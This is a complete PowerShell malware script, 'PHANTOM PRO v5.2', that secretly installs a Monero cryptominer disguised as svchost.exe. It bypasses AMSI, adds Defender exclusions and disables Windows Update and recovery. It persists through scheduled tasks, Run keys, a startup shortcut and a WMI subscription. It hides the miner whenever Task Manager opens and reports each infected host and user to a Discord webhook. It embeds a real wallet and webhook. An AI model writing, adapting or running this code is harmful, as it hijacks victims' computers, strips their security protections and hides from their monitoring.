# ============================================================
#  PHANTOM PRO v5.2 (ULTRA-PRECISION)
#  - Base: 100% Proven v3.1 Stability
#  - Fixed: Safe Svchost Filtering (System-Safe)
#  - Added: Insta-Kill Taskmgr (1s Poll)
#  - Added: Lockdown (Updates + Recovery)
# ============================================================

# [GHOST] AMSI Bypass
try {
    $a=[Ref].Assembly.GetTypes() | Where-Object {$_.Name -eq "AmsiUtils"}
    if ($a) {
        $b=$a.GetField("amsiInitFailed","NonPublic,Static")
        if ($b) { $b.SetValue($null,$true) }
    }
} catch {}

# ==================== CONFIG ====================
$wallet         = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
$webhookUrl     = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
$pool           = "pool.hashvault.pro:443"
$poolBak        = "pool.supportxmr.com:443"
$idleCpu        = 100
$activeCpu      = 30
$idleThreshold  = 120

$installDir     = "$env:APPDATA\WindowsServices"
$xmrigExe       = "$installDir\svchost.exe"
$configFile     = "$installDir\config.json"
$watchdogPs1    = "$installDir\watchdog.ps1"
$watchdogVbs    = "$installDir\monitor.vbs"
$xmrigUrl       = "https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-msvc-win64.zip"
$zipFile        = "$env:TEMP\winsvc.zip"
$extractDir     = "$env:TEMP\winsvc_extract"
$xmrigApiPort   = 45580
$rigId          = "$env:COMPUTERNAME"
$worker         = "$env:COMPUTERNAME"

# ==================== FUNCTIONS ====================

function Install-Miner {
    try {
        # [PRECISION] Kill only YOUR processes - never system svchost
        Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object { 
            ($_.ExecutablePath -eq $xmrigExe) -or 
            ($_.CommandLine -like "*$watchdogVbs*") -or 
            ($_.CommandLine -like "*$watchdogPs1*")
        } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
    } catch {}
    
    Start-Sleep -Seconds 2
    New-Item -ItemType Directory -Path $installDir -Force | Out-Null
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls11 -bor [Net.SecurityProtocolType]::Tls

    $downloaded = $false
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add("User-Agent", "Mozilla/5.0")
        $wc.DownloadFile($xmrigUrl, $zipFile); $downloaded = $true
    } catch {
        try { Invoke-WebRequest -Uri $xmrigUrl -OutFile $zipFile -UseBasicParsing -ErrorAction Stop; $downloaded = $true } catch {}
    }

    if (-not $downloaded) { throw "Download failed" }
    if (Test-Path $extractDir) { Remove-Item $extractDir -Recurse -Force -ErrorAction SilentlyContinue }
    Expand-Archive -Path $zipFile -DestinationPath $extractDir -Force
    $srcExe = Get-ChildItem -Path $extractDir -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($srcExe) { Copy-Item -Path $srcExe.FullName -Destination $xmrigExe -Force }
    Remove-Item $zipFile, $extractDir -Recurse -Force -ErrorAction SilentlyContinue
}

function Write-MinerConfig {
    param([int]$CpuPercent = $idleCpu)
    $cfg = @{
        autosave = $false; "donate-level" = 0; background = $true;
        cpu = @{ "max-threads-hint" = $CpuPercent; priority = 2; "huge-pages" = $true; "huge-pages-jit" = $true; asm = $true; "memory-pool" = $true };
        pools = @(
            @{ url = "stratum+ssl://${pool}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true },
            @{ url = "stratum+ssl://${poolBak}"; user = $wallet; pass = $worker; "rig-id" = $rigId; keepalive = $true; tls = $true }
        );
        http = @{ enabled = $true; host = "127.0.0.1"; port = $xmrigApiPort; restricted = $false };
        randomx = @{ "1gb-pages" = $true; wrmsr = $true; "numa" = $true; mode = "auto"; "cache_qos" = $true }
    } | ConvertTo-Json -Depth 5
    Set-Content -Path $configFile -Value $cfg -Force
}

function Write-Watchdog {
    $code = @"
Add-Type @'
using System;
using System.Runtime.InteropServices;
public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
public class IdleDetect {
    [DllImport("user32.dll")]
    public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    public static uint GetIdleSeconds() {
        LASTINPUTINFO lii = new LASTINPUTINFO();
        lii.cbSize = (uint)Marshal.SizeOf(typeof(LASTINPUTINFO));
        if (!GetLastInputInfo(ref lii)) return 0;
        return ((uint)Environment.TickCount - lii.dwTime) / 1000;
    }
}
'@

`$xmrigExe       = "$xmrigExe"
`$configFile     = "$configFile"
`$xmrigApiPort   = $xmrigApiPort
`$idleCpu        = $idleCpu
`$activeCpu      = $activeCpu
`$idleThreshold  = $idleThreshold
`$lastState      = ""

function Set-XmrigCpu {
    param([int]`$Percent)
    try {
        `$body = @{ "cpu" = @{ "max-threads-hint" = `$Percent } } | ConvertTo-Json -Depth 3
        Invoke-RestMethod -Uri "http://127.0.0.1:`${xmrigApiPort}/2/config" -Method PUT -Body `$body -ContentType "application/json" -ErrorAction Stop | Out-Null
    } catch {}
}

function Ensure-MinerState {
    param([bool]`$shouldRun)
    `$proc = Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { `$_.Path -eq `$xmrigExe }
    if (`$shouldRun -and -not `$proc) {
        Start-Process `$xmrigExe -ArgumentList "--config=`"`$configFile`"" -WindowStyle Hidden -ErrorAction SilentlyContinue
    } elseif (-not `$shouldRun -and `$proc) {
        `$proc | Stop-Process -Force -ErrorAction SilentlyContinue
    }
}

while (`$true) {
    try {
        `$monitored = Get-Process -Name "Taskmgr", "ProcessHacker", "PerfMon", "ResourceMonitor" -ErrorAction SilentlyContinue
        if (`$monitored) {
            Ensure-MinerState -shouldRun `$false
            `$lastState = "monitored"
        } else {
            `$idleSecs = [IdleDetect]::GetIdleSeconds()
            `$isIdle = `$idleSecs -ge `$idleThreshold
            `$targetCpu = if (`$isIdle) { `$idleCpu } else { `$activeCpu }
            `$state = if (`$isIdle) { "idle" } else { "active" }
            if (`$state -ne `$lastState) {
                Ensure-MinerState -shouldRun `$true
                Start-Sleep -Seconds 1
                Set-XmrigCpu -Percent `$targetCpu
                `$lastState = `$state
            }
            Ensure-MinerState -shouldRun `$true
        }
    } catch {}
    Start-Sleep -Seconds 1
}
"@
    Set-Content -Path $watchdogPs1 -Value $code -Force
}

function Write-VbsLauncher {
    Set-Content -Path $watchdogVbs -Value "Set objShell = CreateObject(`"WScript.Shell`")`nobjShell.Run `"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$watchdogPs1`"`"`, 0, False" -Force
}

function Set-Persistence {
    try { & reagentc.exe /disable 2>$null } catch {}
    $taskName = "WindowsServiceUpdate"; $wdTask = "WindowsServiceMonitor"
    try {
        $a1 = New-ScheduledTaskAction -Execute $xmrigExe -Argument "--config=`"$configFile`""
        $a2 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$watchdogVbs`""
        $trig = New-ScheduledTaskTrigger -AtLogon
        Register-ScheduledTask -TaskName $taskName -Action $a1 -Trigger $trig -RunLevel Highest -Force | Out-Null
        Register-ScheduledTask -TaskName $wdTask -Action $a2 -Trigger $trig -RunLevel Highest -Force | Out-Null
    } catch {}

    $reg = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty $reg "WindowsServiceUpdate" "`"$xmrigExe`" --config=`"$configFile`"" -Force
    Set-ItemProperty $reg "WindowsServiceMonitor" "wscript.exe `"$watchdogVbs`"" -Force

    # Restore v3.1 Startup Shortcut
    $start = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup")
    try {
        $ws = New-Object -ComObject WScript.Shell
        $sc = $ws.CreateShortcut("$start\ServiceMonitor.lnk")
        $sc.TargetPath = "wscript.exe"; $sc.Arguments = "`"$watchdogVbs`""; $sc.WindowStyle = 7; $sc.Save()
    } catch {}

    # Restore v3.1 WMI
    try {
        $filter = "WindowsServiceMonitorFilter"; $consumer = "WindowsServiceMonitorConsumer"; $timer = "WindowsServiceTimer"
        Set-WmiInstance -Namespace root\cimv2 -Class __IntervalTimerInstruction -Arguments @{ TimerID = $timer; IntervalBetweenEvents = 300000 } | Out-Null
        $fObj = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{ Name = $filter; EventNameSpace = 'root\cimv2'; QueryLanguage = 'WQL'; Query = "SELECT * FROM __TimerEvent WHERE TimerID = '$timer'" }
        $cObj = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{ Name = $consumer; CommandLineTemplate = "wscript.exe `"$watchdogVbs`"" }
        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter = $fObj; Consumer = $cObj } | Out-Null
    } catch {}

    try { (Get-Item $installDir).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System } catch {}
}

function Lockdown-System {
    try {
        $svcs = "wuauserv", "bits", "dosvc"
        foreach ($s in $svcs) {
            Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
            Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
        }
    } catch {}
}

function Enable-HugePages {
    try {
        $tmpCfg = "$env:TEMP\secpol.cfg"; $tmpDb = "$env:TEMP\secpol.sdb"
        secedit /export /cfg $tmpCfg /quiet 2>$null
        $sid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
        $content = Get-Content $tmpCfg -Raw
        if ($content -match 'SeLockMemoryPrivilege\s*=\s*(.*)') {
            if ($Matches[1] -notlike "*$sid*") { $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid" }
        } else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
        Set-Content $tmpCfg $content -Force
        secedit /configure /db $tmpDb /cfg $tmpCfg /quiet 2>$null
        Remove-Item $tmpCfg, $tmpDb -Force -ErrorAction SilentlyContinue
    } catch {}
}

function Send-DiscordWebhook {
    try {
        $payload = @{ username = "PHANTOM PRO v5.2"; embeds = @(@{ title = "Miner Active! ⚡"; color = 3447003; fields = @(@{ name = "Host"; value = "$env:COMPUTERNAME"; inline = $true }, @{ name = "User"; value = "$env:USERNAME"; inline = $true }); timestamp = (Get-Date).ToUniversalTime().ToString("yyyy-MM-ddTHH:mm:ssZ") }) } | ConvertTo-Json -Depth 5
        Invoke-RestMethod $webhookUrl -Method Post -Body $payload -ContentType "application/json" | Out-Null
    } catch {}
}

# ==================== MAIN ====================
try {
    # CLEAN SWEEP - Exact Path Matching Only
    try {
        Get-ScheduledTask -TaskName "WindowsService*" -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue
        Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq $xmrigExe } | Stop-Process -Force -ErrorAction SilentlyContinue
    } catch {}

    Add-MpPreference -ExclusionPath $installDir, "$env:TEMP" -ErrorAction SilentlyContinue
    Lockdown-System
    Enable-HugePages
    Install-Miner; Write-MinerConfig; Write-Watchdog; Write-VbsLauncher; Set-Persistence
    
    Start-Process $xmrigExe -ArgumentList "--config=`"$configFile`"" -WindowStyle Hidden
    Start-Sleep -Seconds 4
    Start-Process "wscript.exe" -ArgumentList "`"$watchdogVbs`"" -WindowStyle Hidden
    Send-DiscordWebhook
    Write-Host "[+] Phantom Pro v5.2 (Ultrafirm) Success."
} catch { Write-Host "[-] Error: $_" }
